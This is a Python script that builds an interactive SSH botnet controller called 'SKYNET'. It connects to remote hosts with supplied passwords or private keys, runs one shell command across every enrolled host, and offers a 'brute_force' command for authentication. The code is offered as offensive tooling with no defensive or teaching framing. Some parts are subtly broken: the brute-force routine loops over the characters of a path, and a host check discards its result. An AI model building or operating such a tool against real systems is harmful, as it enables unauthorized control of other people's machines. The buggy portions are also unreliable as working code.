#!/usr/bin/env python3
import cmd
import os
import paramiko
import socket
import timeout_decorator
from paramiko import SSHClient, AutoAddPolicy

botnet = []


class BotNet(cmd.Cmd):

    undoc_header = None
    doc_header = 'Commands (type help <command>):'
    prompt = '(SKYNET) '
    intro = """
                                          :s:
                                        /dNMNh:
                                      /dNMMMMMNh:
                                    :dNMMMMMMMMMNh-
                                  :hNMMMMMMMMMMMMMNy-
                                :hNMMMMMMMMMMMMMMMMMNy-
                                :hNMMMMMMMMMMMMMMMMMNd:
                            :/`  `:hNMMMMMMMMMMMMMMd/`  ./.
                          :yNNd/`  `/dNMMMMMMMMMNd/`  .omNmo.
                        -yNMMMMNd+`  `/dNMMMMMNd+`  .omMMMMMmo.
                      -yNMMMMMMMMNd+`  `/dNMNd/`  .omNMMMMMMMNmo.
                    -yNMMMMMMMMMMMMNd+`  `+h/`  .omMMMMMMMMMMMMMmo.
                  -yNMMMMMMMMMMMMMMMMNd+.     .omMMMMMMMMMMMMMMMMMmo.
                -yNMMMMMMMMMMMMMMMMMMMMMm/   +mMMMMMMMMMMMMMMMMMMMMMm+`
              -yNMMMMMMMMMMMMMMMMMMMMMMMMy   hMMMMMMMMMMMMMMMMMMMMMMMMm+`
            -sNMMMMMMMMMMMMMMMMMMMMMMMMMMy   hMMMMMMMMMMMMMMMMMMMMMMMMMNd+`
          .sNMMMMMMMMMMMMMMMMMMMMMMMMMMMMy   hMMMMMMMMMMMMMMMMMMMMMMMMMMMNd+`
        .sNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy   hMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNd/`
      .sNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy   hMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNd/`
    `+dmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmms   ymmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmy.

                    _______ _     _ __   __ __   _ _______ _______
                    |______ |____/    \_/   | \  | |______    |
                    ______| |    \_    |    |  \_| |______    |
    """

    def print_topics(self, header, cmds, cmdlen, maxcol):
        # omits do_EOF from showing in the help description
        if header is not None:
            cmd.Cmd.print_topics(self, header, cmds, cmdlen, maxcol)

    def cmdloop(self, intro=None):
        while True:
            try:
                cmd.Cmd.cmdloop(self, intro)
            except KeyboardInterrupt:
                print("\nExiting...\n")
                exit(0)

    def do_exec_command(self, command):
        """exec_command [uname -a]
        execute botnet command"""
        for client in botnet:
            output = client.send_command(command)
            print('[*] Output from ' + client.host)
            print('[+] ' + output.decode())

    def do_add_client(self, args):
        """add_client [host user password/key]
        Add a client to the botnet"""
        h, u, p = args.split(" ")
        secret_key = self.load_keyfile(p)
        if secret_key:
            c = Client(host=h, user=u, password=None, key=secret_key)
        else:
            c = Client(host=h, user=u, password=p)
        # either way success/fail a Client object is created
        # but if connection failed then the session is null
        if c.session:
            botnet.append(c)
            print("[+] CLIENT ADDED:", c.host)

    def load_keyfile(self, keyfile):
        # if keyfile isn't one of these 3 types it
        # will be treated as a plaintext password
        for cls in (paramiko.RSAKey, paramiko.DSSKey, paramiko.ECDSAKey):
            try:
                return cls.from_private_key_file(keyfile)
            except:
                pass
        else:
            return None

    def do_brute_force(self, args):
        """brute_force [host user password/key]
        brute force authentication"""
        h, u, k = args.split(" ")
        if os.path.isdir(k):
            for keyfile in k:
                argswkey = h + ' ' + ' ' + u + ' ' + k
                self.do_add_client(argswkey)
        else:
            self.do_add_client(args)

    def do_EOF(self, line):
        return True

    def postloop(self):
        print()


class Client:
    def __init__(self, host=None, user=None, password=None, key=None):
        self.host = host
        self.user = user
        self.key = key
        self.password = password
        self.session = self.connect()

    def connect(self):
        # this reduces the timeout of SSHClient's connect()
        # for failed dns lookups
        try:
            self.host_check(self.host)
        except Exception as e:
            # todo logging e
            print('[-] CONNECTION FAILED', self.host)
            return None
        try:
            s = SSHClient()
            s.set_missing_host_key_policy(AutoAddPolicy())
            if self.password:
                s.connect(self.host, port=22, username=self.user,
                          password=self.password, timeout=1)
            else:
                s.connect(self.host, port=22, username=self.user,
                          timeout=1, pkey=self.key)
            return s
        except Exception as e:
            # todo logging e
            print('[-] CONNECTION FAILED:', self.host)

    def send_command(self, cmd):
        stdin, stdout, stderr = self.session.exec_command(cmd)
        return stdout.read()

    @timeout_decorator.timeout(2, use_signals=False)
    def host_check(self, host):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect_ex((host, 22)) == 0


if __name__ == '__main__':
    BotNet().cmdloop()
